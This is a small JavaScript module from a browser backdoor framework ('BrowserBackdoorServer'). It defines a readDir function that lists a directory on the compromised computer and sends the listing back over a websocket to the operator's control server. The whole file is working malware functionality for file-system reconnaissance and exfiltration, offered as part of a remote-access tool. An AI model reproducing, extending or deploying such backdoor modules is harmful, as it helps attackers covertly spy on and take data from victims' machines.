// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Lists all files in a directory
 * Parameters: fullPath
 * Returns: undefined, error, files as string
 * Author: IMcPwn
 */

if (typeof fs === typeof undefined) fs = require('fs');

readDir = function (fullPath) {
    fs.readdir(fullPath, 'utf8', function (err, data) {
        if (err) ws.send(err);
        ws.send(data);
    });
}

return "\nUsage: readDir(fullPath)\n- fullPath is the properly escaped full path of the directory.";
